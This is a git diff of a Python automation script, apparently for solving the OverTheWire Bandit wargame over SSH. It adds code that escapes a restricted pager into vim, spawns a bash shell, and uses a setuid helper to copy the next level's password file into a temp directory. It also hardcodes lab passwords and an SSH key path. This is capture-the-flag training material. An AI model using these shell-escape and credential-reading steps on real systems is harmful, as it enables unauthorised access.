@@ -483,30 +483,61 @@ def bandit25_26(client):
 
     return next_user, next_password
 
+# DONE
 def bandit26_27(client):
 
     next_user = "bandit27"
     
-    """
+    client2 = ssh_connection("bandit25", "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4")
     
-    ssh -i bandit26.sshkey -o StrictHostKeyChecking=accept-new bandit26@bandit.labs.overthewire.org -p 2220
+    stdin, stdout, stderr = client2.exec_command("mktemp -d")
+    temp_dir = stdout.read().decode().strip()
     
-    vim --cmd ':set shell=/bin/sh|:shell'
+    stdin, stdout, stderr = client2.exec_command("chmod o+wx " + temp_dir)
     
-    stty rows 21 columns 129
-    
-    
-    #!/bin/bash
-    stty rows 3 columns 129
+    # Abrir canal interactivo con un pseudo-terminal PEQUEÑO
+    channel = client.invoke_shell(width=80, height=2)  # <--- ¡Truco aquí!
+    time.sleep(1)
 
-    ssh -i /home/bandit25/bandit26.sshkey -o StrictHostKeyChecking=accept-new bandit26@bandit.labs.overthewire.org -p 2220
-    
-    """
+    # Escapar del more con !sh
+    channel.send("v")
+    channel.send("\n")
+    time.sleep(2)
+    channel.send(":set shell=/bin/bash")
+    channel.send("\n")
+    time.sleep(2)
+    channel.send(":shell")
+    channel.send("\n")
+    time.sleep(2)
 
-    # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("whoami")
+    channel.send("id")
+    channel.send("\n")
+    time.sleep(1)
+
+    channel.send("whoami")
+    channel.send("\n")
+    time.sleep(1)
+    
+    # channel.send("cat /etc/bandit_pass/bandit26 > " + temp_dir + "/pass.txt \n")
+    channel.send("./bandit27-do cat /etc/bandit_pass/bandit27 > " + temp_dir + "/pass.txt \n")
+    time.sleep(1)
+
+    # Leer todo el output que queda en el buffer
+    output = ""
+    start_time = time.time()
+    while True:
+        if channel.recv_ready():
+            output += channel.recv(1024).decode(errors="ignore")
+        if time.time() - start_time > 5:  # espera de 5 seg
+            break
+        time.sleep(0.2)
+
+    # Cerrar sesión
+    channel.send("exit\n")
+    
+    stdin, stdout, stderr = client2.exec_command("cat " + temp_dir + "/pass.txt")
     next_password = stdout.read().decode().strip()
-
+    
     client.close()
 
     return next_user, next_password
@@ -516,7 +547,7 @@ def bandit27_28(client):
     next_user = "bandit28"
 
     # Process to obtain the password
-    stdin, stdout, stderr = client.exec_command("")
+    stdin, stdout, stderr = client.exec_command("whoami")
     next_password = stdout.read().decode().strip()
 
     client.close()
@@ -588,9 +619,9 @@ def printCredentials():
 
 if __name__ == '__main__':
     # DEBUG
-    user = "bandit26"
-    # password = "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4"
-    password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit25_26\\id_rsa"
+    user = "bandit27"
+    password = "upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB"
+    # password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit25_26\\id_rsa"
 
     # user, password = bandit22_23(ssh_connection(user, password))
     # printCredentials()
@@ -604,11 +635,11 @@ if __name__ == '__main__':
     # user, password = bandit25_26(ssh_connection(user, password))
     # printCredentials()
     
-    user, password = bandit26_27(ssh_connection(user, password,use_ssh_key=True,sshkey_file=password))
-    printCredentials()
-    
-    # user, password = bandit27_28(ssh_connection(user, password))
+    # user, password = bandit26_27(ssh_connection(user, password,use_ssh_key=True,sshkey_file=password))
     # printCredentials()
+    
+    user, password = bandit27_28(ssh_connection(user, password))
+    printCredentials()
     
     # user, password = bandit28_29(ssh_connection(user, password))
     # printCredentials()
